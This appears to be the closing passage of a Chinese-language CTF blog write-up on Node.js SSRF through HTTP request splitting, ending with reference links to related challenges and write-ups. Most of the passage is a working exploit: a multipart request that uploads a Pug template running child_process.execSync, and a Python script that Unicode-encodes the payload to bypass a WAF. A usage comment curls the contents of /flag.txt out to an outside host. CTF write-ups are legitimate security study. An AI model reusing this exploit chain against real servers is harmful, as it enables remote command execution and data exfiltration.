Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------12837266501973088788260782942
Content-Length: 6279
Origin: http://localhost:8081
Connection: close
Referer: http://localhost:8081/?action=upload
Upgrade-Insecure-Requests: 1

-----------------------------12837266501973088788260782942
Content-Disposition: form-data; name="file"; filename="5am3_get_flag.pug"
Content-Type: ../template

- global.process.mainModule.require('child_process').execSync('evalcmd')
-----------------------------12837266501973088788260782942--


"""

def getParm(payload):
    payload = payload.replace(" ","%C4%A0")
    payload = payload.replace("\n","%C4%8D%C4%8A")
    payload = payload.replace("\"","%C4%A2")
    payload = payload.replace("'","%C4%A7")
    payload = payload.replace("`","%C5%A0")
    payload = payload.replace("!","%C4%A1")

    payload = payload.replace("+","%2B")
    payload = payload.replace(";","%3B")
    payload = payload.replace("&","%26")

    # Bypass Waf
    payload = payload.replace("global","%C5%A7%C5%AC%C5%AF%C5%A2%C5%A1%C5%AC")
    payload = payload.replace("process","%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3")
    payload = payload.replace("mainModule","%C5%AD%C5%A1%C5%A9%C5%AE%C5%8D%C5%AF%C5%A4%C5%B5%C5%AC%C5%A5")
    payload = payload.replace("require","%C5%B2%C5%A5%C5%B1%C5%B5%C5%A9%C5%B2%C5%A5")
    payload = payload.replace("root","%C5%B2%C5%AF%C5%AF%C5%B4")
    payload = payload.replace("child_process","%C5%A3%C5%A8%C5%A9%C5%AC%C5%A4%C5%9F%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3")
    payload = payload.replace("exec","%C5%A5%C5%B8%C5%A5%C5%A3")

    return payload

def run(url,cmd):
    payloadC =  payloadRaw.replace("evalcmd",cmd)
    urlC = url+"/core?q="+getParm(payloadC)
    requests.get(urlC)

    requests.get(url+"/?action=5am3_get_flag").text

if __name__ == '__main__':
    targetUrl = sys.argv[1]
    cmd = sys.argv[2]
    print run(targetUrl,cmd)

# python exp.py http://127.0.0.1:8081 "curl eval.com -X POST -d `cat /flag.txt`"
```

------

实不相瞒，我被部分编码时应该编哪一些这个问题困扰了一天，经历了n次的环境崩溃和好多好多令人无语的情况；其实用全编码就是最简单快捷的，但是还是想自己折腾一下

这个系列下一篇应该是HTTP请求走私或者是302跳转ssrf相关的，不过近期应该是不会再碰js了，垃圾Node.js，毁我青春

------

{{% spoiler "以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（" %}}
[CAPEC-220: Client-Server Protocol Manipulation](https://capec.mitre.org/data/definitions/220.html)  |  [CAPEC-105: HTTP Request Splitting](https://capec.mitre.org/data/definitions/105.html)  |  [CAPEC-33: HTTP Request Smuggling](https://capec.mitre.org/data/definitions/33.html)

[http: add --security-revert for CVE-2018-12116](https://github.com/nodejs/node/commit/dd20c0186f)

[Security Bugs in Practice: SSRF via Request Splitting](https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/)

[A New Era of SSRF - Exploiting URL Parser in  Trending Programming Languages!](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)

[Membershop - docker](https://github.com/Hpd0ger/My_ctf_challenge/tree/master/Isoon2019-Membershop)  |  [Split second - docker](https://github.com/nullcon/hackim-2020/tree/master/web/split_second)  |  [Node Game - docker](https://github.com/5am3/My-CTF-Challenges/tree/master/2020-icq-gys)

[Proxy-Proxy - wp](https://infosecwriteups.com/nodejs-ssrf-by-response-splitting-asis-ctf-finals-2018-proxy-proxy-question-walkthrough-9a2424923501)  |  [Membershop - wp](https://www.wolai.com/ctfhub/hj3e9WMu8X4ePZ3sADXfsH)  |  [Split second - wp1](https://ctftime.org/writeup/18293)  |  [Split second - wp2](https://r3billions.com/writeup-split-second/)  |  [Split second - wp3](https://blog.p6.is/nullcon-hackim-2020-split-second/)  |  [Node Game - wp](https://www.zhaoj.in/read-6462.html)

{{% /spoiler %}}